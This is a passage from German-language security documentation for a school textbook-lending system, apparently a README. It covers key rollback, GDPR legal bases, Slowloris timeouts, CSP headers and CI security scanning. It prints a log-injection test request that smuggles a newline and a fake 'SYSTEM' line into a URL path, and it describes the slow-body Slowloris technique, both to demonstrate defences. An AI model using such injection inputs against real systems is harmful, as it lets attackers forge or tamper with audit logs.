dann greift wieder der Compose-Default und die Daten sind lesbar wie zuvor:

```bash
sed -i '/^APP_ENCRYPTION_KEY=/d' .env
docker compose up -d backend
```

Wurde bereits rotiert, darf die Zeile **nicht** gelöscht werden: Dann muss der richtige
neue Schlüssel hinein (er steht im Scrollback des Rotationslaufs, den das Kommando
ausdrücklich ausgibt). Im Notfall führt der Weg über `vor-rotation.sql` und
`cmd/restore-backup`.

### Adressdaten, Eltern-E-Mail und Rechtsgrundlage (VVT-Grundlage)

Adressspalten (`strasse`, `hausnummer`, `plz`, `ort`) und `eltern_email` sind **bewusst
vorhanden**. Migration 003 enthielt ursprünglich einen `RAISE EXCEPTION`-Wächter, der
Adressspalten blockiert hätte — er wurde entfernt, weil die Daten fachlich nötig sind.
Beides steht in Anlage 1 der SchDSV (1.4 Anschrift, 1.14 E-Mail der Eltern).

**Was das System mit der Eltern-E-Mail tatsächlich tut (Stand 22.08.2026, am Code
geprüft):** Sie wird im Schülerprofil als `mailto:`-Link angezeigt
(`StudentProfileStammdaten.svelte`), im Mahnwesen als Hinweis-Symbol „Eltern-Mail
vorhanden" geführt, und die Vorlage `MAHNUNG_ELTERN` füllt den **gedruckten**
Elternbrief (`api/reports_pdf.go`). **Es geht keine automatische E-Mail an Eltern** —
Mahn-Mails des Bulk-Laufs gehen an die **Klassenleitungen**
(`api/mahnwesen_bulk_mail.go`). Bis zum 22.08.2026 behauptete dieser Abschnitt „E-Mail
für Eltern-Mahnungen"; das war Absicht, nicht Zustand. Entscheidung: **Doku an den Code
angeglichen, keine Eltern-Mahnmail gebaut** — § 15 SchDSV erlaubt die Eltern-E-Mail nur
für erforderliche Schulkommunikation, und der gedruckte Brief plus Klassenleitung deckt
das Mahnwesen ab. Wer eine Eltern-Mahnmail einführt, ergänzt das VVT und den
Datenschutzhinweis **vorher**.

**Für das Verzeichnis von Verarbeitungstätigkeiten (VVT) — zwei Tätigkeiten, zwei
Rechtsgrundlagen** (Entwurf nach HBDI-Muster in
[datenschutz/vvt_entwurf.md](datenschutz/vvt_entwurf.md)):

| | (1) Lernmittelausleihe | (2) Schülerbücherei |
|---|---|---|
| **Rechtsgrundlage** | Art. 6 Abs. 1 lit. e DSGVO i. V. m. § 83 HSchG (Datenverarbeitung durch Schulen) und § 153 HSchG / Verordnung zur Lernmittelfreiheit — öffentlich-rechtliches Nutzungsverhältnis, kein Vertrag | Einwilligung Art. 6 Abs. 1 lit. a DSGVO (freiwillige Nutzung; so das HBDI-Muster-VVT „Schulbibliothek"); für Minderjährige durch die Erziehungsberechtigten |
| **Zweck** | Nachweis von Ausleihe und Rücklauf (Bestandskartei, HKM-Leitfaden 11.3), Mahnung, Schadensersatz (12.3–12.7, Leistungsbescheid über die Schulaufsicht) | Ausleihverwaltung, Rückgabeerinnerung, Vormerkung |
| **Anschrift** | gedruckte Rechnung / Elternbrief | gedruckter Elternbrief bei Mahnung |
| **Eltern-E-Mail** | `mailto:`-Link für manuelle Kontaktaufnahme; kein Versand durch das System | dito |
| **Löschung** | Abgänger-Routine (unten) + Lesehistorie-Trennung nach 730 Tagen | Abgänger-Routine + Lesehistorie-Trennung nach 90 Tagen |

Bis zum 22.08.2026 stand hier „Art. 6 Abs. 1 lit. c i. V. m. lit. b" — lit. b
(Vertrag) passt auf keine der beiden Tätigkeiten, lit. c (rechtliche Verpflichtung)
trifft allenfalls die Lernmittel mittelbar. Die Einordnung oben folgt dem hessischen
Rahmen (SchDSV, § 83a HSchG, HBDI-Muster); bestätigen muss sie der schulische
Datenschutzbeauftragte.

**Aufbewahrung/Löschung:** Beim Abgang eines Schülers (ohne offene Vorgänge) leert die
Anonymisierungsroutine (`anonymisiereAbgaenger`) diese Felder umgehend; Lesehistorie
nach Frist (oben). Offene Punkte der Schule: [datenschutz_offene_punkte.md](datenschutz_offene_punkte.md).

---

## ⏱️ Verbindungsfristen (Slowloris)

Eine Anfrage, die formal korrekt ist und trotzdem nie endet, hält Verbindung, Goroutine
und im Zweifel eine Datenbankverbindung fest. Bis zum 06.08.2026 stand am `http.Server`
nur `ReadHeaderTimeout` — die **Kopfzeilen** waren begrenzt, der **Rumpf** nicht. Wer
`Content-Length: 10000000` ankündigte und danach ein Byte pro Minute nachreichte, blieb
beliebig lange verbunden. Die `TimeoutMiddleware` half dagegen nicht: Ein
Kontext-Deadline bricht kein blockierendes `Read` auf der Verbindung ab.

| Frist | Wert | Gilt für |
|---|---|---|
| `ReadHeaderTimeout` | 5 s | Kopfzeilen |
| `ReadTimeout` (`api.StandardLesefrist`) | 30 s | Kopf **und** Rumpf, alle gewöhnlichen Endpunkte |
| Lesefrist der Import-Pfade | 5 min (`LangLaufendeFrist`) | `ErweitereLesefristFuerLangeUploads`, dieselbe Pfadliste wie die Bearbeitungsfrist |
| `IdleTimeout` | 120 s | Zwischen zwei Anfragen einer Keep-Alive-Verbindung |
| `WriteTimeout` | **bewusst nicht gesetzt** | Es gälte für die ganze Antwort — und `/events` (SSE) ist definitionsgemäß eine Antwort, die nie endet |

Die Schreibrichtung begrenzt stattdessen Caddy (`write_timeout 600s`) und für die
Bearbeitungsdauer die `TimeoutMiddleware`. Beide Richtungen der Lesefrist sind belegt
(`api/middleware_lesefrist_test.go`): Ein langsamer Rumpf auf einem gewöhnlichen
Endpunkt wird abgeschnitten, derselbe Rumpf auf `/api/import/…` geht durch. Der Test
läuft gegen einen echten Server, nicht gegen einen `ResponseRecorder` — der kennt die
Verbindung nicht und hätte die Middleware grün durchlaufen lassen, ohne dass je eine
Frist gesetzt wurde.

---

## 🛡️ Netzwerksicherheit & Security-Header

Restriktive HTTP-Header in `internal/middleware/security.go`:
- `frame-ancestors 'none'` — verhindert Clickjacking via iFrame
- `form-action 'self'` — Formulare nur an eigene API
- `script-src 'self'` — kein externes Script-Loading
- `base-uri 'self'` — fällt **nicht** auf `default-src` zurück; ohne die Direktive biegt
  ein eingeschleustes `<base href>` jede relative URL der SPA um
- `object-src 'none'` — Plugin-Inhalte sind ein klassischer Umgehungsweg für `script-src`
- `X-Content-Type-Options: nosniff`
- `X-Frame-Options: DENY`

### `img-src` ohne `https:` (seit 06.08.2026)

Das pauschale `https:` erlaubte Bilder von **jedem** fremden Server. Was das wert war,
ist oben unter XSS gemessen: Bilder waren der offene Weg für eingeschleustes Markup,
während Skripte blockiert wurden.

Gebraucht wurde `https:` von acht Ansichten, die Cover direkt bei Google Books und
OpenLibrary holten. Das war ohnehin die falsche Bauweise — es meldete den Browser jeder
Lehrkraft bei einem Dritten an und gab dabei preis, welche ISBNs die Schule gerade
ansieht. Alle acht laufen jetzt über den eigenen Cover-Proxy
(`frontend/src/lib/utils/coverSrc.js` → `/api/images/cover`, Host-Allowlist in
`api/image_caching.go`). Die Bilder kommen unverändert an, nur eben vom eigenen Server.

`data:` und `blob:` bleiben erlaubt: erzeugte Barcodes/QR-Codes und Datei-Vorschauen
vor dem Hochladen.

`style-src` behält `'unsafe-inline'`, und das bleibt eine bewusste Entscheidung: Das
Frontend setzt an rund 30 Stellen inline `style`-Attribute, ein Dutzend davon mit
interpolierten Werten (Ausweis-Designer: `style="left: {el.x}mm"`). Nonces gelten für
`<style>`-**Elemente**, nicht für style-**Attribute**, und `'unsafe-hashes'` scheidet
aus, weil sich der Hash eines interpolierten Werts bei jedem Rendern ändert.

Gate: `frontend/src/lib/utils/coverHerkunft.test.js` durchsucht den gesamten
Frontend-Quelltext nach direkt eingebundenen Fremdadressen. Genau dieses Gate hat beim
Umbau eine Stelle gefunden, die eine Textsuche übersehen hatte
(`lib/useBookAkte.svelte.js`).

---

## 🔍 Automatische Sicherheitsprüfungen (CI)

Die Prüfungen kommen aus **zwei** Quellen, und das ist der Punkt, an dem man sich
verzählt.

**Vier Jobs in `.github/workflows/security-scan.yml`** — bei jedem Push und Pull Request
auf `main`, zusätzlich **montags 07:00 UTC** (frisch veröffentlichte CVEs treffen auch
Code, der sich nicht geändert hat) und auf Knopfdruck:

| Prüfung | Sieht | Blinder Fleck |
|---|---|---|
| `govulncheck` | Bekannte CVEs in Go-Abhängigkeiten, **aufrufbezogen** (meldet nur, was tatsächlich erreicht wird) | Eigener Code |
| `gosec` | Muster im Go-Quelltext (SAST), Ausschlussliste im Workflow | Zusammenhänge über Funktionsgrenzen |
| `npm audit` | CVEs in Frontend-Abhängigkeiten (`--audit-level=high --omit=dev`) | Eigener Code |
| `trivy` + Container-Smoke | Das gebaute Image; dazu: läuft es unprivilegiert, sind die per `exec.Command` gerufenen Werkzeuge da (`pg_dump`), ist jedes Volume-Ziel für `appuser` beschreibbar | Anwendungslogik |

**CodeQL läuft daneben, ohne Datei im Repository.** Für dieses Repository ist GitHubs
**Standard-Setup** aktiv (Settings → Code security → Code scanning). Es analysiert `go`,
`javascript-typescript` und `actions` und erscheint als die drei Checks `Analyze (…)`.
Das ist die Prüfung, die keine der vier oben leistet: Sie baut einen Datenflussgraphen
und fragt, ob etwas von außen Kontrolliertes irgendwo ungeprüft ankommt.

> **Kein zweiter CodeQL-Job.** Am 11.08.2026 stand einer in `security-scan.yml`,
> begründet mit einer Lücke, die es nicht gab — das Standard-Setup lief nachweislich
> schon vorher (grüne `Analyze (…)`-Checks auf `e4753eb`). Zwei Konfigurationen vertragen
> sich nicht: Der eigene Job scheiterte reproduzierbar beim Hochladen des Ergebnisses und
> hinterließ zwei dauerhaft rote Checks ohne einen einzigen zusätzlichen Befund. Wer je
> eigene Query-Suiten braucht, schaltet **zuerst** das Standard-Setup ab.

Zwei Dinge dazu ehrlich benannt:

- **Kostenlos, weil dieses Repository öffentlich ist.** Für ein privates Repository wäre
  dieselbe Analyse kostenpflichtig (GitHub Code Security). Beim Umstellen auf privat
  fällt sie weg und meldet das nicht von allein.
- **Der JavaScript-Extraktor liest `.js`, aber keine `.svelte`-Dateien** — gemessen am
  11.08.2026: 78 Dateien mit 9.741 Zeilen gegen 188 Dateien mit 24.604 Zeilen. Das klingt
  nach einem Drittel, trifft aber die richtige Hälfte: Anmeldung, `apiFetch`,
  Rechte-Logik und die Stores liegen in `.js`; in den `.svelte`-Dateien steht überwiegend
  Markup.

### Log-Injection: 25 Befunde, alle bereits abgewehrt

CodeQLs erster Lauf meldete 25 Fundstellen `go/log-injection`. Sie sind in **dieser**
Anwendung Fehlalarme, und zwar nicht aus Nachlässigkeit, sondern weil die Senke schon
escaped: `slog.SetDefault` hängt seit Go 1.21 auch das Standard-`log`-Paket ein, alle
`log.Printf` laufen also durch den `JSONHandler`.

Am laufenden Container nachgestellt — `router.go` protokolliert jede Anfrage mit dem
bereits dekodierten `r.URL.Path`, ein `%0A` kommt dort als echter Umbruch an:

```
GET /api/%0ASYSTEM:%20Alle%20Sperren%20aufgehoben
→ {"time":"…","level":"INFO","msg":"Incoming Request: GET /api/\nSYSTEM: …"}
```

Ein einziger Eintrag, der Umbruch escaped **innerhalb** des Strings. Keine gefälschte
Zeile. Der Kommentar an `slog.SetDefault` in `main.go` hält das fest: Wer diese Zeile
entfernt oder ein `log.SetOutput` dahinter setzt, hebt die strukturierte Ausgabe **und**
diesen Schutz auf.

### Prüfungen vor dem Push (lokal)

- `scripts/git-hooks/pre-push` (installiert per `scripts/install-hooks.sh`): sechs Gates,
  darunter Go-Tests, `svelte-check` und `npm audit`. Der Hook sagt außerdem an, **was er
  nicht geprüft hat** — die `*_pg_test.go` überspringen sich ohne `TEST_DATABASE_URL`
  still, mit grünem „ok" daneben.
- `../security-scan.sh`, `scripts/pruefe_secrets.sh`, `scripts/sonar_scan.sh` — siehe
  [SCRIPTS.md](SCRIPTS.md).

---

## 📋 Audit-Trail

- Alle administrativen Aktionen und Buchbewegungen werden in `audit_logs` protokolliert (append-only als Konvention — kein UPDATE/DELETE außer der DSGVO-PII-Tilgung; kein DB-Trigger-Zwang, siehe Migration 083).
- Auditierung erfolgt **nach** dem Transaktions-Commit (kein Rollback-Risiko).
